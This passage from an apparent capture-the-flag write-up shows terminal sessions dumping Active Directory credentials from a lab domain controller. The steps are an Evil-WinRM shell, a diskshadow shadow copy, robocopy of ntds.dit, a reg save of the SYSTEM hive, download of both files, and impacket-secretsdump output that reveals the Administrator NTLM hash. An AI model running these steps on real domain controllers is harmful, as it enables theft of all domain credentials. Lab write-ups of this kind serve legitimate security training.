<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>&gt;<span class="w"> </span>mkdir<span class="w"> </span>Temp
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="w">    </span>Directory:<span class="w"> </span>C:<span class="se">\\</span>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>d-----<span class="w">         </span><span class="m">8</span>/5/2025<span class="w">   </span><span class="m">9</span>:27<span class="w"> </span>PM<span class="w">                </span>Temp
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>Temp
</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>upload<span class="w"> </span>sth.dsh
</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>
</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>Info:<span class="w"> </span>Uploading<span class="w"> </span>/home/ch3ckm8/sth.dsh<span class="w"> </span>to<span class="w"> </span>C:<span class="se">\\</span>Temp<span class="se">\\</span>sth.dsh
</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>
</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a>Data:<span class="w"> </span><span class="m">112</span><span class="w"> </span>bytes<span class="w"> </span>of<span class="w"> </span><span class="m">112</span><span class="w"> </span>bytes<span class="w"> </span>copied
</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a>
</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>Info:<span class="w"> </span>Upload<span class="w"> </span>successful!
</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>diskshadow<span class="w"> </span>/s<span class="w"> </span>sth.dsh
</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a>Microsoft<span class="w"> </span>DiskShadow<span class="w"> </span>version<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a>Copyright<span class="w"> </span><span class="o">(</span>C<span class="o">)</span><span class="w"> </span><span class="m">2013</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation
</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a>On<span class="w"> </span>computer:<span class="w">  </span>DC01,<span class="w">  </span><span class="m">8</span>/5/2025<span class="w"> </span><span class="m">9</span>:28:35<span class="w"> </span>PM
</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a>
</span><span id="__span-52-20"><a id="__codelineno-52-20" name="__codelineno-52-20" href="#__codelineno-52-20"></a>-&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>context<span class="w"> </span>persistent<span class="w"> </span>nowriters
</span><span id="__span-52-21"><a id="__codelineno-52-21" name="__codelineno-52-21" href="#__codelineno-52-21"></a>-&gt;<span class="w"> </span>add<span class="w"> </span>volume<span class="w"> </span>c:<span class="w"> </span><span class="nb">alias</span><span class="w"> </span>sth
</span><span id="__span-52-22"><a id="__codelineno-52-22" name="__codelineno-52-22" href="#__codelineno-52-22"></a>-&gt;<span class="w"> </span>create
</span><span id="__span-52-23"><a id="__codelineno-52-23" name="__codelineno-52-23" href="#__codelineno-52-23"></a>Alias<span class="w"> </span>sth<span class="w"> </span><span class="k">for</span><span class="w"> </span>shadow<span class="w"> </span>ID<span class="w"> </span><span class="o">{</span>92e80450-422d-42ac-9db0-1d6e2c594fd2<span class="o">}</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>as<span class="w"> </span>environment<span class="w"> </span>variable.
</span><span id="__span-52-24"><a id="__codelineno-52-24" name="__codelineno-52-24" href="#__codelineno-52-24"></a>Alias<span class="w"> </span>VSS_SHADOW_SET<span class="w"> </span><span class="k">for</span><span class="w"> </span>shadow<span class="w"> </span><span class="nb">set</span><span class="w"> </span>ID<span class="w"> </span><span class="o">{</span>db98334c-1c71-4a02-b8bf-564a028e6afe<span class="o">}</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>as<span class="w"> </span>environment<span class="w"> </span>variable.
</span><span id="__span-52-25"><a id="__codelineno-52-25" name="__codelineno-52-25" href="#__codelineno-52-25"></a>
</span><span id="__span-52-26"><a id="__codelineno-52-26" name="__codelineno-52-26" href="#__codelineno-52-26"></a>Querying<span class="w"> </span>all<span class="w"> </span>shadow<span class="w"> </span>copies<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>shadow<span class="w"> </span>copy<span class="w"> </span><span class="nb">set</span><span class="w"> </span>ID<span class="w"> </span><span class="o">{</span>db98334c-1c71-4a02-b8bf-564a028e6afe<span class="o">}</span>
</span><span id="__span-52-27"><a id="__codelineno-52-27" name="__codelineno-52-27" href="#__codelineno-52-27"></a>
</span><span id="__span-52-28"><a id="__codelineno-52-28" name="__codelineno-52-28" href="#__codelineno-52-28"></a><span class="w">    </span>*<span class="w"> </span>Shadow<span class="w"> </span>copy<span class="w"> </span><span class="nv">ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span>92e80450-422d-42ac-9db0-1d6e2c594fd2<span class="o">}</span><span class="w">       </span>%sth%
</span><span id="__span-52-29"><a id="__codelineno-52-29" name="__codelineno-52-29" href="#__codelineno-52-29"></a><span class="w">        </span>-<span class="w"> </span>Shadow<span class="w"> </span>copy<span class="w"> </span>set:<span class="w"> </span><span class="o">{</span>db98334c-1c71-4a02-b8bf-564a028e6afe<span class="o">}</span><span class="w">   </span>%VSS_SHADOW_SET%
</span><span id="__span-52-30"><a id="__codelineno-52-30" name="__codelineno-52-30" href="#__codelineno-52-30"></a><span class="w">        </span>-<span class="w"> </span>Original<span class="w"> </span>count<span class="w"> </span>of<span class="w"> </span>shadow<span class="w"> </span><span class="nv">copies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span>
</span><span id="__span-52-31"><a id="__codelineno-52-31" name="__codelineno-52-31" href="#__codelineno-52-31"></a><span class="w">        </span>-<span class="w"> </span>Original<span class="w"> </span>volume<span class="w"> </span>name:<span class="w"> </span><span class="se">\\\\</span>?<span class="se">\\</span>Volume<span class="o">{</span>6cd5140b-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\\</span><span class="w"> </span><span class="o">[</span>C:<span class="se">\\</span><span class="o">]</span>
</span><span id="__span-52-32"><a id="__codelineno-52-32" name="__codelineno-52-32" href="#__codelineno-52-32"></a><span class="w">        </span>-<span class="w"> </span>Creation<span class="w"> </span>time:<span class="w"> </span><span class="m">8</span>/5/2025<span class="w"> </span><span class="m">9</span>:28:36<span class="w"> </span>PM
</span><span id="__span-52-33"><a id="__codelineno-52-33" name="__codelineno-52-33" href="#__codelineno-52-33"></a><span class="w">        </span>-<span class="w"> </span>Shadow<span class="w"> </span>copy<span class="w"> </span>device<span class="w"> </span>name:<span class="w"> </span><span class="se">\\\\</span>?<span class="se">\\</span>GLOBALROOT<span class="se">\\</span>Device<span class="se">\\</span>HarddiskVolumeShadowCopy1
</span><span id="__span-52-34"><a id="__codelineno-52-34" name="__codelineno-52-34" href="#__codelineno-52-34"></a><span class="w">        </span>-<span class="w"> </span>Originating<span class="w"> </span>machine:<span class="w"> </span>DC01.BLACKFIELD.local
</span><span id="__span-52-35"><a id="__codelineno-52-35" name="__codelineno-52-35" href="#__codelineno-52-35"></a><span class="w">        </span>-<span class="w"> </span>Service<span class="w"> </span>machine:<span class="w"> </span>DC01.BLACKFIELD.local
</span><span id="__span-52-36"><a id="__codelineno-52-36" name="__codelineno-52-36" href="#__codelineno-52-36"></a><span class="w">        </span>-<span class="w"> </span>Not<span class="w"> </span>exposed
</span><span id="__span-52-37"><a id="__codelineno-52-37" name="__codelineno-52-37" href="#__codelineno-52-37"></a><span class="w">        </span>-<span class="w"> </span>Provider<span class="w"> </span>ID:<span class="w"> </span><span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
</span><span id="__span-52-38"><a id="__codelineno-52-38" name="__codelineno-52-38" href="#__codelineno-52-38"></a><span class="w">        </span>-<span class="w"> </span>Attributes:<span class="w">  </span>No_Auto_Release<span class="w"> </span>Persistent<span class="w"> </span>No_Writers<span class="w"> </span>Differential
</span><span id="__span-52-39"><a id="__codelineno-52-39" name="__codelineno-52-39" href="#__codelineno-52-39"></a>
</span><span id="__span-52-40"><a id="__codelineno-52-40" name="__codelineno-52-40" href="#__codelineno-52-40"></a>Number<span class="w"> </span>of<span class="w"> </span>shadow<span class="w"> </span>copies<span class="w"> </span>listed:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-52-41"><a id="__codelineno-52-41" name="__codelineno-52-41" href="#__codelineno-52-41"></a>-&gt;<span class="w"> </span>expose<span class="w"> </span>%sth%<span class="w"> </span>z:
</span><span id="__span-52-42"><a id="__codelineno-52-42" name="__codelineno-52-42" href="#__codelineno-52-42"></a>-&gt;<span class="w"> </span>%sth%<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span>92e80450-422d-42ac-9db0-1d6e2c594fd2<span class="o">}</span>
</span><span id="__span-52-43"><a id="__codelineno-52-43" name="__codelineno-52-43" href="#__codelineno-52-43"></a>The<span class="w"> </span>shadow<span class="w"> </span>copy<span class="w"> </span>was<span class="w"> </span>successfully<span class="w"> </span>exposed<span class="w"> </span>as<span class="w"> </span>z:<span class="se">\\</span>.
</span><span id="__span-52-44"><a id="__codelineno-52-44" name="__codelineno-52-44" href="#__codelineno-52-44"></a>-&gt;
</span><span id="__span-52-45"><a id="__codelineno-52-45" name="__codelineno-52-45" href="#__codelineno-52-45"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>robocopy<span class="w"> </span>/b<span class="w"> </span>z:windowsntds<span class="w"> </span>.<span class="w"> </span>ntds.dit
</span><span id="__span-52-46"><a id="__codelineno-52-46" name="__codelineno-52-46" href="#__codelineno-52-46"></a>
</span><span id="__span-52-47"><a id="__codelineno-52-47" name="__codelineno-52-47" href="#__codelineno-52-47"></a>-------------------------------------------------------------------------------
</span><span id="__span-52-48"><a id="__codelineno-52-48" name="__codelineno-52-48" href="#__codelineno-52-48"></a><span class="w">   </span>ROBOCOPY<span class="w">     </span>::<span class="w">     </span>Robust<span class="w"> </span>File<span class="w"> </span>Copy<span class="w"> </span><span class="k">for</span><span class="w"> </span>Windows
</span><span id="__span-52-49"><a id="__codelineno-52-49" name="__codelineno-52-49" href="#__codelineno-52-49"></a>-------------------------------------------------------------------------------
</span><span id="__span-52-50"><a id="__codelineno-52-50" name="__codelineno-52-50" href="#__codelineno-52-50"></a>
</span><span id="__span-52-51"><a id="__codelineno-52-51" name="__codelineno-52-51" href="#__codelineno-52-51"></a><span class="w">  </span>Started<span class="w"> </span>:<span class="w"> </span>Tuesday,<span class="w"> </span>August<span class="w"> </span><span class="m">5</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="m">9</span>:28:44<span class="w"> </span>PM
</span><span id="__span-52-52"><a id="__codelineno-52-52" name="__codelineno-52-52" href="#__codelineno-52-52"></a><span class="w">   </span>Source<span class="w"> </span>:<span class="w"> </span>Z:<span class="se">\\</span>windowsntds<span class="se">\\</span>
</span><span id="__span-52-53"><a id="__codelineno-52-53" name="__codelineno-52-53" href="#__codelineno-52-53"></a><span class="w">     </span>Dest<span class="w"> </span>:<span class="w"> </span>C:<span class="se">\\</span>Temp<span class="se">\\</span>
</span><span id="__span-52-54"><a id="__codelineno-52-54" name="__codelineno-52-54" href="#__codelineno-52-54"></a>
</span><span id="__span-52-55"><a id="__codelineno-52-55" name="__codelineno-52-55" href="#__codelineno-52-55"></a><span class="w">    </span>Files<span class="w"> </span>:<span class="w"> </span>ntds.dit
</span><span id="__span-52-56"><a id="__codelineno-52-56" name="__codelineno-52-56" href="#__codelineno-52-56"></a>
</span><span id="__span-52-57"><a id="__codelineno-52-57" name="__codelineno-52-57" href="#__codelineno-52-57"></a><span class="w">  </span>Options<span class="w"> </span>:<span class="w"> </span>/DCOPY:DA<span class="w"> </span>/COPY:DAT<span class="w"> </span>/B<span class="w"> </span>/R:1000000<span class="w"> </span>/W:30
</span><span id="__span-52-58"><a id="__codelineno-52-58" name="__codelineno-52-58" href="#__codelineno-52-58"></a>
</span><span id="__span-52-59"><a id="__codelineno-52-59" name="__codelineno-52-59" href="#__codelineno-52-59"></a>------------------------------------------------------------------------------
</span><span id="__span-52-60"><a id="__codelineno-52-60" name="__codelineno-52-60" href="#__codelineno-52-60"></a>
</span><span id="__span-52-61"><a id="__codelineno-52-61" name="__codelineno-52-61" href="#__codelineno-52-61"></a><span class="m">2025</span>/08/05<span class="w"> </span><span class="m">21</span>:28:44<span class="w"> </span>ERROR<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="o">(</span>0x00000002<span class="o">)</span><span class="w"> </span>Accessing<span class="w"> </span>Source<span class="w"> </span>Directory<span class="w"> </span>Z:<span class="se">\\</span>windowsntds<span class="se">\\</span>
</span><span id="__span-52-62"><a id="__codelineno-52-62" name="__codelineno-52-62" href="#__codelineno-52-62"></a>The<span class="w"> </span>system<span class="w"> </span>cannot<span class="w"> </span>find<span class="w"> </span>the<span class="w"> </span>file<span class="w"> </span>specified.
</span><span id="__span-52-63"><a id="__codelineno-52-63" name="__codelineno-52-63" href="#__codelineno-52-63"></a>
</span><span id="__span-52-64"><a id="__codelineno-52-64" name="__codelineno-52-64" href="#__codelineno-52-64"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>robocopy<span class="w"> </span>/b<span class="w"> </span>z:<span class="se">\\</span>windows<span class="se">\\</span>ntds<span class="w"> </span>.<span class="w"> </span>ntds.dit
</span><span id="__span-52-65"><a id="__codelineno-52-65" name="__codelineno-52-65" href="#__codelineno-52-65"></a>
</span><span id="__span-52-66"><a id="__codelineno-52-66" name="__codelineno-52-66" href="#__codelineno-52-66"></a>-------------------------------------------------------------------------------
</span><span id="__span-52-67"><a id="__codelineno-52-67" name="__codelineno-52-67" href="#__codelineno-52-67"></a><span class="w">   </span>ROBOCOPY<span class="w">     </span>::<span class="w">     </span>Robust<span class="w"> </span>File<span class="w"> </span>Copy<span class="w"> </span><span class="k">for</span><span class="w"> </span>Windows
</span><span id="__span-52-68"><a id="__codelineno-52-68" name="__codelineno-52-68" href="#__codelineno-52-68"></a>-------------------------------------------------------------------------------
</span><span id="__span-52-69"><a id="__codelineno-52-69" name="__codelineno-52-69" href="#__codelineno-52-69"></a>
</span><span id="__span-52-70"><a id="__codelineno-52-70" name="__codelineno-52-70" href="#__codelineno-52-70"></a><span class="w">  </span>Started<span class="w"> </span>:<span class="w"> </span>Tuesday,<span class="w"> </span>August<span class="w"> </span><span class="m">5</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="m">9</span>:29:30<span class="w"> </span>PM
</span><span id="__span-52-71"><a id="__codelineno-52-71" name="__codelineno-52-71" href="#__codelineno-52-71"></a><span class="w">   </span>Source<span class="w"> </span>:<span class="w"> </span>z:<span class="se">\\</span>windows<span class="se">\\</span>ntds<span class="se">\\</span>
</span><span id="__span-52-72"><a id="__codelineno-52-72" name="__codelineno-52-72" href="#__codelineno-52-72"></a><span class="w">     </span>Dest<span class="w"> </span>:<span class="w"> </span>C:<span class="se">\\</span>Temp<span class="se">\\</span>
</span><span id="__span-52-73"><a id="__codelineno-52-73" name="__codelineno-52-73" href="#__codelineno-52-73"></a>
</span><span id="__span-52-74"><a id="__codelineno-52-74" name="__codelineno-52-74" href="#__codelineno-52-74"></a><span class="w">    </span>Files<span class="w"> </span>:<span class="w"> </span>ntds.dit
</span><span id="__span-52-75"><a id="__codelineno-52-75" name="__codelineno-52-75" href="#__codelineno-52-75"></a>
</span><span id="__span-52-76"><a id="__codelineno-52-76" name="__codelineno-52-76" href="#__codelineno-52-76"></a><span class="w">  </span>Options<span class="w"> </span>:<span class="w"> </span>/DCOPY:DA<span class="w"> </span>/COPY:DAT<span class="w"> </span>/B<span class="w"> </span>/R:1000000<span class="w"> </span>/W:30
</span><span id="__span-52-77"><a id="__codelineno-52-77" name="__codelineno-52-77" href="#__codelineno-52-77"></a>
</span><span id="__span-52-78"><a id="__codelineno-52-78" name="__codelineno-52-78" href="#__codelineno-52-78"></a>------------------------------------------------------------------------------
</span><span id="__span-52-79"><a id="__codelineno-52-79" name="__codelineno-52-79" href="#__codelineno-52-79"></a>
</span><span id="__span-52-80"><a id="__codelineno-52-80" name="__codelineno-52-80" href="#__codelineno-52-80"></a><span class="w">                       </span><span class="m">1</span><span class="w">    </span>z:<span class="se">\\</span>windows<span class="se">\\</span>ntds<span class="se">\\</span>
</span><span id="__span-52-81"><a id="__codelineno-52-81" name="__codelineno-52-81" href="#__codelineno-52-81"></a><span class="w">        </span>New<span class="w"> </span>File<span class="w">          </span><span class="m">18</span>.0<span class="w"> </span>m<span class="w">    </span>ntds.dit
</span><span id="__span-52-82"><a id="__codelineno-52-82" name="__codelineno-52-82" href="#__codelineno-52-82"></a><span class="m">0</span>.0%
</span><span id="__span-52-83"><a id="__codelineno-52-83" name="__codelineno-52-83" href="#__codelineno-52-83"></a><span class="m">0</span>.3%
</span><span id="__span-52-84"><a id="__codelineno-52-84" name="__codelineno-52-84" href="#__codelineno-52-84"></a>...
</span><span id="__span-52-85"><a id="__codelineno-52-85" name="__codelineno-52-85" href="#__codelineno-52-85"></a><span class="m">99</span>.6%
</span><span id="__span-52-86"><a id="__codelineno-52-86" name="__codelineno-52-86" href="#__codelineno-52-86"></a><span class="m">100</span>%
</span><span id="__span-52-87"><a id="__codelineno-52-87" name="__codelineno-52-87" href="#__codelineno-52-87"></a><span class="m">100</span>%
</span><span id="__span-52-88"><a id="__codelineno-52-88" name="__codelineno-52-88" href="#__codelineno-52-88"></a>
</span><span id="__span-52-89"><a id="__codelineno-52-89" name="__codelineno-52-89" href="#__codelineno-52-89"></a>------------------------------------------------------------------------------
</span><span id="__span-52-90"><a id="__codelineno-52-90" name="__codelineno-52-90" href="#__codelineno-52-90"></a>
</span><span id="__span-52-91"><a id="__codelineno-52-91" name="__codelineno-52-91" href="#__codelineno-52-91"></a><span class="w">               </span>Total<span class="w">    </span>Copied<span class="w">   </span>Skipped<span class="w">  </span>Mismatch<span class="w">    </span>FAILED<span class="w">    </span>Extras
</span><span id="__span-52-92"><a id="__codelineno-52-92" name="__codelineno-52-92" href="#__codelineno-52-92"></a><span class="w">    </span>Dirs<span class="w"> </span>:<span class="w">         </span><span class="m">1</span><span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">1</span><span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">0</span>
</span><span id="__span-52-93"><a id="__codelineno-52-93" name="__codelineno-52-93" href="#__codelineno-52-93"></a><span class="w">   </span>Files<span class="w"> </span>:<span class="w">         </span><span class="m">1</span><span class="w">         </span><span class="m">1</span><span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">0</span>
</span><span id="__span-52-94"><a id="__codelineno-52-94" name="__codelineno-52-94" href="#__codelineno-52-94"></a><span class="w">   </span>Bytes<span class="w"> </span>:<span class="w">   </span><span class="m">18</span>.00<span class="w"> </span>m<span class="w">   </span><span class="m">18</span>.00<span class="w"> </span>m<span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">0</span><span class="w">         </span><span class="m">0</span>
</span><span id="__span-52-95"><a id="__codelineno-52-95" name="__codelineno-52-95" href="#__codelineno-52-95"></a><span class="w">   </span>Times<span class="w"> </span>:<span class="w">   </span><span class="m">0</span>:00:00<span class="w">   </span><span class="m">0</span>:00:00<span class="w">                       </span><span class="m">0</span>:00:00<span class="w">   </span><span class="m">0</span>:00:00
</span><span id="__span-52-96"><a id="__codelineno-52-96" name="__codelineno-52-96" href="#__codelineno-52-96"></a>
</span><span id="__span-52-97"><a id="__codelineno-52-97" name="__codelineno-52-97" href="#__codelineno-52-97"></a><span class="w">   </span>Speed<span class="w"> </span>:<span class="w">           </span><span class="m">121770116</span><span class="w"> </span>Bytes/sec.
</span><span id="__span-52-98"><a id="__codelineno-52-98" name="__codelineno-52-98" href="#__codelineno-52-98"></a><span class="w">   </span>Speed<span class="w"> </span>:<span class="w">            </span><span class="m">6967</span>.741<span class="w"> </span>MegaBytes/min.
</span><span id="__span-52-99"><a id="__codelineno-52-99" name="__codelineno-52-99" href="#__codelineno-52-99"></a><span class="w">   </span>Ended<span class="w"> </span>:<span class="w"> </span>Tuesday,<span class="w"> </span>August<span class="w"> </span><span class="m">5</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span><span class="m">9</span>:29:31<span class="w"> </span>PM
</span><span id="__span-52-100"><a id="__codelineno-52-100" name="__codelineno-52-100" href="#__codelineno-52-100"></a>
</span><span id="__span-52-101"><a id="__codelineno-52-101" name="__codelineno-52-101" href="#__codelineno-52-101"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>reg<span class="w"> </span>save<span class="w"> </span>hklmsystem<span class="w"> </span>c:Tempsystem
</span><span id="__span-52-102"><a id="__codelineno-52-102" name="__codelineno-52-102" href="#__codelineno-52-102"></a>reg.exe<span class="w"> </span>:<span class="w"> </span>ERROR:<span class="w"> </span>Invalid<span class="w"> </span>key<span class="w"> </span>name.
</span><span id="__span-52-103"><a id="__codelineno-52-103" name="__codelineno-52-103" href="#__codelineno-52-103"></a><span class="w">    </span>+<span class="w"> </span>CategoryInfo<span class="w">          </span>:<span class="w"> </span>NotSpecified:<span class="w"> </span><span class="o">(</span>ERROR:<span class="w"> </span>Invalid<span class="w"> </span>key<span class="w"> </span>name.:String<span class="o">)</span><span class="w"> </span><span class="o">[]</span>,<span class="w"> </span>RemoteException
</span><span id="__span-52-104"><a id="__codelineno-52-104" name="__codelineno-52-104" href="#__codelineno-52-104"></a><span class="w">    </span>+<span class="w"> </span>FullyQualifiedErrorId<span class="w"> </span>:<span class="w"> </span>NativeCommandError
</span><span id="__span-52-105"><a id="__codelineno-52-105" name="__codelineno-52-105" href="#__codelineno-52-105"></a>Type<span class="w"> </span><span class="s2">&quot;REG SAVE /?&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>usage.
</span><span id="__span-52-106"><a id="__codelineno-52-106" name="__codelineno-52-106" href="#__codelineno-52-106"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>reg<span class="w"> </span>save<span class="w"> </span>hklm<span class="se">\\</span>system<span class="w"> </span>c:<span class="se">\\</span>Temp<span class="se">\\</span>system
</span><span id="__span-52-107"><a id="__codelineno-52-107" name="__codelineno-52-107" href="#__codelineno-52-107"></a>The<span class="w"> </span>operation<span class="w"> </span>completed<span class="w"> </span>successfully.
</span><span id="__span-52-108"><a id="__codelineno-52-108" name="__codelineno-52-108" href="#__codelineno-52-108"></a>
</span><span id="__span-52-109"><a id="__codelineno-52-109" name="__codelineno-52-109" href="#__codelineno-52-109"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>download<span class="w"> </span>ntds.dit
</span><span id="__span-52-110"><a id="__codelineno-52-110" name="__codelineno-52-110" href="#__codelineno-52-110"></a>
</span><span id="__span-52-111"><a id="__codelineno-52-111" name="__codelineno-52-111" href="#__codelineno-52-111"></a>Info:<span class="w"> </span>Downloading<span class="w"> </span>C:<span class="se">\\</span>Temp<span class="se">\\</span>ntds.dit<span class="w"> </span>to<span class="w"> </span>ntds.dit
</span><span id="__span-52-112"><a id="__codelineno-52-112" name="__codelineno-52-112" href="#__codelineno-52-112"></a>
</span><span id="__span-52-113"><a id="__codelineno-52-113" name="__codelineno-52-113" href="#__codelineno-52-113"></a>Info:<span class="w"> </span>Download<span class="w"> </span>successful!
</span><span id="__span-52-114"><a id="__codelineno-52-114" name="__codelineno-52-114" href="#__codelineno-52-114"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>download<span class="w"> </span>system
</span><span id="__span-52-115"><a id="__codelineno-52-115" name="__codelineno-52-115" href="#__codelineno-52-115"></a>
</span><span id="__span-52-116"><a id="__codelineno-52-116" name="__codelineno-52-116" href="#__codelineno-52-116"></a>Info:<span class="w"> </span>Downloading<span class="w"> </span>C:<span class="se">\\</span>Temp<span class="se">\\</span>system<span class="w"> </span>to<span class="w"> </span>system
</span><span id="__span-52-117"><a id="__codelineno-52-117" name="__codelineno-52-117" href="#__codelineno-52-117"></a>
</span><span id="__span-52-118"><a id="__codelineno-52-118" name="__codelineno-52-118" href="#__codelineno-52-118"></a>Info:<span class="w"> </span>Download<span class="w"> </span>successful!
</span><span id="__span-52-119"><a id="__codelineno-52-119" name="__codelineno-52-119" href="#__codelineno-52-119"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\\</span>Temp&gt;<span class="w"> </span>
</span></code></pre></div>
<h3 id="dumping-ntds-using-the-system-hive">Dumping NTDS using the SYSTEM hive</h3>
<p>Finally, run secretsdump to <strong>extract NTLM password hashes</strong> and <strong>other credential data</strong> from an <strong>offline copy of the AD database (<code>ntds.dit</code>)</strong>, using the <strong>Boot Key from the <code>SYSTEM</code> hive</strong>.<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>impacket-secretsdump<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit<span class="w"> </span>-system<span class="w"> </span>system<span class="w"> </span><span class="nb">local</span>
</span></code></pre></div></p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>Impacket<span class="w"> </span>v0.13.0.dev0+20250130.104306.0f4b866<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Target<span class="w"> </span>system<span class="w"> </span>bootKey:<span class="w"> </span>0x73d83e56de8961ca9f243e1a49638393
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\\</span>uid:rid:lmhash:nthash<span class="o">)</span>
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Searching<span class="w"> </span><span class="k">for</span><span class="w"> </span>pekList,<span class="w"> </span>be<span class="w"> </span>patient
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>PEK<span class="w"> </span><span class="c1"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Reading<span class="w"> </span>and<span class="w"> </span>decrypting<span class="w"> </span>hashes<span class="w"> </span>from<span class="w"> </span>ntds.dit<span class="w"> </span>
</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
